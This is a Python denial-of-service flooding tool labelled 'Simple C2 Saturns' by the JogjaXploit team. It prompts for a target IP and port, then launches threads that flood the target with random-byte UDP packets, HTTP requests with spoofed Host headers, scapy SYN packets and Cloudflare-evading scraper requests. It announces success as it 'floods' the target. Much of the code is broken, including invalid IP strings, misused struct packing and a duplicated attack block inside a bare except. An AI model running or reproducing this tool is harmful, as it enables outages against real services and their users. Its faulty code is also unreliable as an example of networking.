import socket, threading, random, os, colorama, cloudscraper, requests
from sqlite3 import Time
from scapy.all import *
from colorama import Fore

fake = ['192.165.6.6', '192.176.76.7', '192.156.6.6', '192.155.5.5', '192.143.2.2', '188.1421.41.4', '187.1222.12.1', '192.153.4.4', '192.154.32.4', '192.1535.53.25', '192.154.545.5', '192.143.43.4', '192.165.6.9', '188.1545.54.3']
global ua
ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
if os.name == "posix":
    os.system('clear')
elif os.name == "nt":
    os.system('cls')
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
#THIS IS MADE BY MrSanZz Team : JogjaXploit !#THIS IS MADE BY MrSanZz Team : JogjaXploit !
logo = """
                                         _.oo.
                 _.u[[/;:,.         .odMMMMMM'
              .o888UU[[[/;:-.  .o@P^    MMM^
             oN88888UU[[[/;::-.        dP^
            dNMMNN888UU[[[/;:--.   .o@P^
           ,MMMMMMN888UU[[/;::-. o@^
           NNMMMNN888UU[[[/~.o@P^
           888888888UU[[[/o@^-..
          oI8888UU[[[/o@P^:--..
       .@^  YUU[[[/o@^;::---..
     oMP     ^/o@P^;:::---..
  .dMMM    .o@^ ^;::---...
 dMMMMMMM@^`       `^^^^
YMMMUP^
              Simple C2 Saturns
                   V : 1.2
              MADE BY : MrSanZz
             TEAM  : JogjaXploit
"""
print(Fore.LIGHTMAGENTA_EX + logo)
try:
    ip = input(f"\033[1;37mIP Target : ")
    port = int(input("Port : "))
    bytes = int(input("Bytes Per Sec : "))
    thrs = int(input("Thread : "))
    bost = input("Use Boost ? Y/N : ")
    if os.name == "posix":
        os.system('clear')
    elif os.name == "nt":
        os.system('cls')
    if bost == 'y':
        bytes = bytes + 500
    else:
        bytes = bytes 
    print(Fore.LIGHTMAGENTA_EX + logo)
    print(Fore.LIGHTRED_EX+"Attacking...")
    print(Fore.LIGHTWHITE_EX+"ATTACK STATUS: ")
    print("╔═════════════════")
    print(f"║ IP    : {ip}   ")
    print(f"║ Port  : {port} ")
    print(f"║ BPS   : {bytes}")
    print(f"║ Thrds : {thrs} ")
    print(f"║ Boost : {bost} ")
    print(f"║ Bot   : {bytes} ")
    print("╚═════════════════")
    def c2():
        for fk in fake:
            try:
                s1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP
                byte = random._urandom(60000)
                sent = 5000
                s1.sendto(byte, (ip,port))
                for i in range(bytes):
                    s1.sendto(byte, (ip,port))
                    s1.sendto(byte, (ip,port))
                s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #HTTP
                s2.connect((ip,port))
                s2.send(("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\n").encode("utf-8"), (ip,port))
                s2.send(("User-Agent: "+random.choice(ua)+"\r\n").encode("utf-8"), (ip,port))
                s2.send(("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'").encode("utf-8"), (ip,port))
                s2.send(("Connection: Keep-Alive\r\n\r\n").encode("utf-8"), (ip,port))
                s2.send(byte)
                s3 = socket.socket(socket.AF_INET, socket.SOCK_RAW) #TLS
                s3.connect((ip,port))
                s3.send((byte))
                fuck = IP(dst=ip) #TCP
                tcp = TCP(sport=RandShort(), dport=port, flags="S")
                raw = Raw(b"X"*60000)
                p = ip / tcp / raw
                send(p, loop=bytes, verbose=0)
                scraper = cloudscraper.create_scraper()
                scraper.get(ip, timeout=thrs)
                udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tls = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                byte = random._urandom(65000)
                tip = tuple(ip)
                udp.sendto(byte, (ip,port))
                http.connect((ip,port))
                msg = {
                    "GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\n"
                    "User-Agent: "+random.choice(ua)+"\r\n"
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
                    "Connection: Keep-Alive\r\n\r\n"
                }
                tls.connect((ip,port))
                tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
                session = requests.session()
                scraper = cloudscraper.create_scraper(sess=session)
                scraper = cloudscraper.create_scraper(disableCloudflareV1=True)
                for i in range(bytes):
                    udp.sendto(byte, (ip,port))
                    udp.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n").encode('utf-8'), (ip,port))
                    http.sendto(byte, (ip,port))
                    tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
                    pack = "SYN\x00"
                    pack_len = len(pack)
                    tcp_syn_packet = pack + struct.pack("!i", ip, port) + struct.pack("!i", ip, port)
                    tcp_syn_packet = tcp_syn_packet + ' \x80\x00\x00\x00 '
                    tcp_syn_packet = tcp_syn_packet + ' \x00\x00\x00\x80 '
                    # Add TCP/IP header
                    tcp_packet = tcp_syn_packet + struct.pack('!'+'i', tcp_syn_packet.nbytes)
                    tcp.send(tcp_packet, (ip,port))
                    scraper.get(ip, timeout=thrs)
                    scraper = cloudscraper.create_scraper(server_hostname=fk)
                    scraper.get(
                        ip,
                        headers={'Host': fk}
                    )
            except OSError:
                continue
            except TypeError:
                continue
            except socket.gaierror:
                print(Fore.LIGHTRED_EX+"[!] Fail get target info, did you type the target correct? [!]")
                exit()
            except TimeoutError:
                print("\n")
                print(Fore.LIGHTRED_EX+"TARGET IS DOWN ! ")
            except:
                print(Fore.LIGHTMAGENTA_EX+"[ C2 ] INFO : SUCCESSFULLY FLOODING TARGET <3 [ C2 ]")
                s1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP
                byte = random._urandom(60000)
                sent = 5000
                s1.sendto(byte, (ip,port))
                for i in range(bytes):
                    s1.sendto(byte, (ip,port))
                    s1.sendto(byte, (ip,port))
                s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #HTTP
                s2.connect((ip,port))
                s2.send(("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\n").encode("utf-8"), (ip,port))
                s2.send(("User-Agent: "+random.choice(ua)+"\r\n").encode("utf-8"), (ip,port))
                s2.send(("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'").encode("utf-8"), (ip,port))
                s2.send(("Connection: Keep-Alive\r\n\r\n").encode("utf-8"), (ip,port))
                s2.send(byte)
                s3 = socket.socket(socket.AF_INET, socket.SOCK_RAW) #TLS
                s3.connect((ip,port))
                s3.send((byte))
                fuck = IP(dst=ip) #TCP
                tcp = TCP(sport=RandShort(), dport=port, flags="S")
                raw = Raw(b"X"*60000)
                p = ip / tcp / raw
                send(p, loop=bytes, verbose=0)
                scraper = cloudscraper.create_scraper()
                scraper.get(ip, timeout=thrs)
                udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tls = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                byte = random._urandom(65000)
                tip = tuple(ip)
                udp.sendto(byte, (ip,port))
                http.connect((ip,port))
                msg = {
                    "GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\n"
                    "User-Agent: "+random.choice(ua)+"\r\n"
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
                    "Connection: Keep-Alive\r\n\r\n"
                }
                tls.connect((ip,port))
                tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
                session = requests.session()
                scraper = cloudscraper.create_scraper(sess=session)
                scraper = cloudscraper.create_scraper(disableCloudflareV1=True)
                for i in range(bytes):
                    udp.sendto(byte, (ip,port))
                    udp.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n").encode('utf-8'), (ip,port))
                    http.sendto(byte, (ip,port))
                    tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
                    pack = "SYN\x00"
                    pack_len = len(pack)
                    tcp_syn_packet = pack + struct.pack("!i", ip, port) + struct.pack("!i", ip, port)
                    tcp_syn_packet = tcp_syn_packet + ' \x80\x00\x00\x00 '
                    tcp_syn_packet = tcp_syn_packet + ' \x00\x00\x00\x80 '
                    # Add TCP/IP header
                    tcp_packet = tcp_syn_packet + struct.pack('!'+'i', tcp_syn_packet.nbytes)
                    tcp.send(tcp_packet, (ip,port))
                    scraper.get(ip, timeout=thrs)
                    scraper = cloudscraper.create_scraper(server_hostname=fk)
                    scraper.get(
                        ip,
                        headers={'Host': fk}
                    )
    for i in range(thrs):
        threads = threading.Thread(target=c2)
        threads.start()
except ValueError:
    print("\033[1;33mDid you fill the target info correctly? please retry!")
